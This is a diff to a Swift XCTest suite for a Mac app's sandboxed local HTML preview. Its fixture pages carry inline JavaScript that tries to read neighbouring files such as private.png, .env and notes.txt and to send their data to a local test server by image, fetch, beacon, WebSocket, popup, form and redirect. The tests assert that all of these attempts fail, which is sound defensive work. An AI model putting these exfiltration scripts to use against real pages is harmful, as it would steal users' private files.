@@ -60,10 +60,28 @@ final class LocalPreviewTests: XCTestCase {
         deinit { listener.cancel() }
     }
 
-    /// The verify-fix rounds: a page that names the page beside it, in an
-    /// iframe and a fetch, can't read it, and gets nothing out either way.
-    /// Every way out is tried against a server on this Mac, and none reaches it.
-    func testAPreviewCanSendNothingOut() async throws {
+    /// Waits for the preview to finish loading, then runs `body` as the
+    /// app's own script in the page (WebKit runs that with the page's
+    /// scripts off), standing in for what a page's script or a click would do.
+    private func loaded(_ view: WKWebView) async throws {
+        for _ in 0..<100 {
+            try await Task.sleep(for: .milliseconds(100))
+            if view.url?.scheme == LocalPreviewSchemeHandler.scheme, !view.isLoading,
+               (try? await view.evaluateJavaScript("document.readyState") as? String) == "complete" { return }
+        }
+        XCTFail("the page never finished")
+    }
+
+    private func run(_ body: String, in view: WKWebView) async throws -> Any? {
+        try await view.callAsyncJavaScript(body, contentWorld: .page)
+    }
+
+    /// The last verify-fix round: a page's own scripts don't run, so a file
+    /// its markup names (`<a href="private.png">`) can be shown but never
+    /// read, and the inline script that tries to read it and send it out
+    /// does nothing. The ways out are then tried as clicks and as the app's
+    /// own script, against a server on this Mac, and none reaches it.
+    func testAPreviewsScriptsDontRunAndNothingGetsOut() async throws {
         let server = try Listener()
         try await server.start()
         // Loopback, which skips proxies, so only the rule list, the policy
@@ -83,32 +101,20 @@ final class LocalPreviewTests: XCTestCase {
         XCTAssertGreaterThan(before, 0)
 
         try write("private.html", Data("<p>the secret</p>".utf8))
+        try write("private.png", png)
         try write("index.html", Data("""
-        <!doctype html><html><body>
+        <!doctype html><html><head><title>preview</title></head><body>
         <iframe src="private.html" id="f"></iframe>
+        <a href="private.png">picture</a>
         <a id="away" href="\(out)/clicked">away</a>
+        <a id="far" href="\(named)/clicked">far</a>
         <form id="form" method="post" action="\(out)/form"><input name="d" value="x"></form>
         <script>
-        window.results = null;
-        window.addEventListener('load', async () => {
-          const r = {};
-          try { r.secret = await (await fetch('private.html')).text(); } catch (e) { r.secret = 'none'; }
-          const d = encodeURIComponent(r.secret);
-          new Image().src = '\(out)/img?d=' + d;
-          try { await fetch('\(out)/fetch?d=' + d, { mode: 'no-cors' }); r.fetch = 'sent'; } catch (e) { r.fetch = 'blocked'; }
-          try { navigator.sendBeacon('\(out)/beacon', d); } catch (e) {}
-          try { new WebSocket('ws://\(host):\(server.port)/ws'); } catch (e) {}
-          const link = document.createElement('link'); link.rel = 'stylesheet'; link.href = '\(out)/css?d=' + d; document.head.appendChild(link);
-          try { window.open('\(out)/popup?d=' + d); } catch (e) {}
-          r.rtc = typeof RTCPeerConnection;
-          window.results = r;
-          const far = document.createElement('a'); far.href = '\(named)/clicked?d=' + d; document.body.appendChild(far);
-          new Image().src = '\(named)/img?d=' + d;
-          try { await fetch('\(named)/fetch?d=' + d, { mode: 'no-cors' }); } catch (e) {}
-          setTimeout(() => far.click(), 500);
-          setTimeout(() => document.getElementById('away').click(), 1000);
-          setTimeout(() => document.getElementById('form').submit(), 2000);
-          setTimeout(() => { location.href = '\(out)/location?d=' + d; }, 3000);
+        document.title = 'script ran';
+        fetch('private.png').then(r => r.arrayBuffer()).then(b => {
+          new Image().src = '\(out)/img?d=' + b.byteLength;
+          fetch('\(out)/fetch?d=' + b.byteLength, { mode: 'no-cors' });
+          location.href = '\(out)/location?d=' + b.byteLength;
         });
         </script></body></html>
         """.utf8))
@@ -116,81 +122,78 @@ final class LocalPreviewTests: XCTestCase {
         let pool = WebPanelPool(defaults: UserDefaults(suiteName: "LocalPreviewTests.\(UUID().uuidString)")!)
         pool.previewProxy = .hostPort(host: "127.0.0.1", port: NWEndpoint.Port(rawValue: sink.port)!)
         let view = pool.webView(for: dir.appendingPathComponent("index.html"))
-        var results: [String: Any]?
-        for _ in 0..<100 {
-            try await Task.sleep(for: .milliseconds(100))
-            if let got = try? await view.evaluateJavaScript("window.results") as? [String: Any] { results = got; break }
-        }
-        let r = try XCTUnwrap(results, "the page never finished")
-        // It couldn't read the page beside it, though its markup names it...
-        XCTAssertFalse((r["secret"] as? String ?? "").contains("the secret"), "\(r["secret"] ?? "")")
+        try await loaded(view)
+        // The page's own script never ran.
+        let title = try await view.evaluateJavaScript("document.title") as? String
+        XCTAssertEqual(title, "preview")
+        // The page beside it isn't served, even framed.
         let framed = try? await view.evaluateJavaScript("document.getElementById('f').contentDocument?.body?.innerText ?? 'none'") as? String
         XCTAssertFalse((framed ?? "").contains("the secret"))
-        XCTAssertEqual(r["fetch"] as? String, "blocked")
-        XCTAssertEqual(r["rtc"] as? String, "undefined", "WebRTC goes round the proxy")
-        // ...and after the click, the form and the location change have all had their turn,
-        try await Task.sleep(for: .seconds(4))
-        // nothing reached the server, and the page is still the preview.
+        let rtc = try await view.evaluateJavaScript("typeof RTCPeerConnection") as? String
+        XCTAssertEqual(rtc, "undefined", "WebRTC goes round the proxy")
+        // Were a script to run anyway, none of its ways out work.
+        let fetched = try await run("""
+        const d = 'x';
+        new Image().src = '\(out)/img?d=' + d;
+        new Image().src = '\(named)/img?d=' + d;
+        try { navigator.sendBeacon('\(out)/beacon', d); } catch (e) {}
+        try { new WebSocket('ws://\(host):\(server.port)/ws'); } catch (e) {}
+        const link = document.createElement('link'); link.rel = 'stylesheet'; link.href = '\(out)/css?d=' + d; document.head.appendChild(link);
+        try { window.open('\(out)/popup?d=' + d); } catch (e) {}
+        try { await fetch('\(named)/fetch?d=' + d, { mode: 'no-cors' }); } catch (e) {}
+        try { await fetch('\(out)/fetch?d=' + d, { mode: 'no-cors' }); return 'sent'; } catch (e) { return 'blocked'; }
+        """, in: view) as? String
+        XCTAssertEqual(fetched, "blocked")
+        // And clicks on its links, its form, and a location change.
+        _ = try await run("document.getElementById('far').click()", in: view)
+        try await Task.sleep(for: .milliseconds(500))
+        _ = try await run("document.getElementById('away').click()", in: view)
+        try await Task.sleep(for: .milliseconds(500))
+        _ = try? await run("document.getElementById('form').submit()", in: view)
+        try await Task.sleep(for: .milliseconds(500))
+        _ = try? await run("location.href = '\(out)/location'", in: view)
+        try await Task.sleep(for: .seconds(2))
+        // Nothing reached the server, and the page is still the preview.
         XCTAssertEqual(server.hits, before, "a request got out of the preview: \(server.requests)")
         // At most a bare CONNECT reached the proxy (a closed port in the app),
         // never a request with the page's data in it.
-        XCTAssertTrue(sink.requests.allSatisfy { $0.hasPrefix("CONNECT ") && !$0.contains("secret") }, "\(sink.requests)")
-        XCTAssertFalse(sink.requests.contains { $0.contains("?d=") })
+        XCTAssertTrue(sink.requests.allSatisfy { $0.hasPrefix("CONNECT ") }, "\(sink.requests)")
         XCTAssertEqual(view.url?.scheme, LocalPreviewSchemeHandler.scheme)
         XCTAssertEqual(view.url?.lastPathComponent, "index.html")
     }
 
-    func testAPreviewLoadsWhatItNamesAndNothingBesideIt() async throws {
+    /// A page still shows its own style and picture, with its scripts off,
+    /// and the files beside it it doesn't name aren't served.
+    func testAPreviewShowsItsStyleAndPicture() async throws {
         try write("style.css", Data("body { color: rgb(1, 2, 3); }".utf8))
         try write("pic.png", png)
         try write("secret.png", png)
         try write(".env", Data("SECRET=hunter2".utf8))
         try write("notes.txt", Data("private".utf8))
-        // The secret's names are built at run time, so the page never names them.
         try write("index.html", Data("""
-        <!doctype html><html><head><link rel="stylesheet" href="style.css"></head><body>
-        <img id="pic" src="pic.png">
-        <script>
-        const dot = '.', n = (a, b) => a + b;
-        async function tryRead(path) {
-          try { const r = await fetch(path); return r.ok ? 'read:' + (await r.text()) : 'refused:' + r.status; }
-          catch (e) { return 'refused:error'; }
-        }
-        function tryPicture(path) {
-          return new Promise(done => { const i = new Image(); i.onload = () => done('read'); i.onerror = () => done('refused'); i.src = path; });
-        }
-        window.results = null;
-        window.addEventListener('load', async () => {
-          window.results = {
-            env: await tryRead(dot + 'env'),
-            notes: await tryRead(n('notes', '.txt')),
-            fileURL: await tryRead('file://' + \(String(reflecting: dir.path)) + '/' + dot + 'env'),
-            secretPicture: await tryPicture(n('secret', '.png')),
-            climb: await tryRead(n('..', '/') + 'x.png'),
-            picture: document.getElementById('pic').naturalWidth,
-            color: getComputedStyle(document.body).color,
-          };
-        });
-        </script></body></html>
+        <!doctype html><html><head><title>preview</title><link rel="stylesheet" href="style.css"></head><body>
+        <img id="pic" src="pic.png"><script>document.title = 'script ran';</script>
+        </body></html>
         """.utf8))
 
         let pool = WebPanelPool(defaults: UserDefaults(suiteName: "LocalPreviewTests.\(UUID().uuidString)")!)
         let view = pool.webView(for: dir.appendingPathComponent("index.html"))
-        var results: [String: Any]?
-        for _ in 0..<100 {
-            try await Task.sleep(for: .milliseconds(100))
-            if let got = try? await view.evaluateJavaScript("window.results") as? [String: Any] { results = got; break }
+        try await loaded(view)
+        let color = try await view.evaluateJavaScript("getComputedStyle(document.body).color") as? String
+        let width = try await view.evaluateJavaScript("document.getElementById('pic').naturalWidth") as? NSNumber
+        let title = try await view.evaluateJavaScript("document.title") as? String
+        XCTAssertEqual(color, "rgb(1, 2, 3)")
+        XCTAssertEqual(width?.intValue, 1)
+        XCTAssertEqual(title, "preview", "the page's script ran")
+        let refused = try await run("""
+        async function tryRead(path) {
+          try { const r = await fetch(path); return r.ok ? 'read:' + (await r.text()) : 'refused:' + r.status; }
+          catch (e) { return 'refused:error'; }
         }
-        let r = try XCTUnwrap(results, "the page never finished")
-        XCTAssertEqual(view.url?.scheme, LocalPreviewSchemeHandler.scheme)
-        // Its own style and picture still load.
-        XCTAssertEqual(r["color"] as? String, "rgb(1, 2, 3)")
-        XCTAssertEqual((r["picture"] as? NSNumber)?.intValue, 1)
-        // Nothing beside it.
-        XCTAssertEqual(r["env"] as? String, "refused:404")
-        XCTAssertEqual(r["notes"] as? String, "refused:404")
-        XCTAssertEqual(r["secretPicture"] as? String, "refused")
-        XCTAssertEqual(r["climb"] as? String, "refused:404")
-        XCTAssertEqual((r["fileURL"] as? String)?.hasPrefix("refused"), true)
+        return [await tryRead('.env'), await tryRead('notes.txt'), await tryRead('secret.png'), await tryRead('../x.png'),
+                await tryRead('file://' + \(String(reflecting: dir.path)) + '/.env')];
+        """, in: view) as? [String]
+        XCTAssertEqual(refused?.count, 5)
+        XCTAssertTrue(refused?.allSatisfy { $0.hasPrefix("refused") } ?? false, "\(refused ?? [])")
     }
 }
